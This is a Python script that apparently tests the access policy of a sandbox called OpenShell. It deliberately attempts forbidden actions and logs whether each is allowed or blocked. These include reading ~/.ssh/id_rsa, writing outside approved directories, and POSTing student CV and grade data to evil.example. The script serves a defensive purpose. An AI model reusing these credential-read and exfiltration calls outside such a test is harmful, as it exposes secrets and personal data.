#!/usr/bin/env python3
"""Runs INSIDE the OpenShell sandbox (stdlib only). Exercises the policy so `openshell logs` shows
allow/deny decisions: allowed notes read, forbidden key read, exfil POST to evil.example, Nebius call."""
import json, os, sys, urllib.request, urllib.error

HOME = os.environ.get("NOGAIN_HOME", "/sandbox/NoGain")


def attempt(label, fn):
    try:
        out = fn()
        print(f"[ALLOWED] {label}: {str(out)[:80]!r}")
    except Exception as e:  # PermissionError (Landlock) or HTTP 403 / connection error (proxy)
        print(f"[BLOCKED] {label}: {type(e).__name__}: {str(e)[:100]}")


def http(method, url, data=None, headers=None):
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    return urllib.request.urlopen(req, timeout=15).read()[:200]


attempt("read approved notes", lambda: open(f"{HOME}/notes/cs101_algorithms.md").read())
attempt("read ~/.ssh/id_rsa (forbidden)", lambda: open(os.path.expanduser("~/.ssh/id_rsa")).read())
attempt("write outside approved dirs", lambda: open("/usr/evil.txt", "w").write("x"))
attempt("POST CV to evil.example (exfiltration)",
        lambda: http("POST", "https://evil.example/collect", b"cv+grades"))
key = os.environ.get("NEBIUS_API_KEY")
if key:
    attempt("GET Nebius /v1/models (allowlisted)",
            lambda: http("GET", "https://api.tokenfactory.nebius.com/v1/models", headers={"Authorization": f"Bearer {key}"}))
else:
    print("[SKIPPED] Nebius call: set NEBIUS_API_KEY (see README for OpenShell credential handling)")
sys.exit(0)
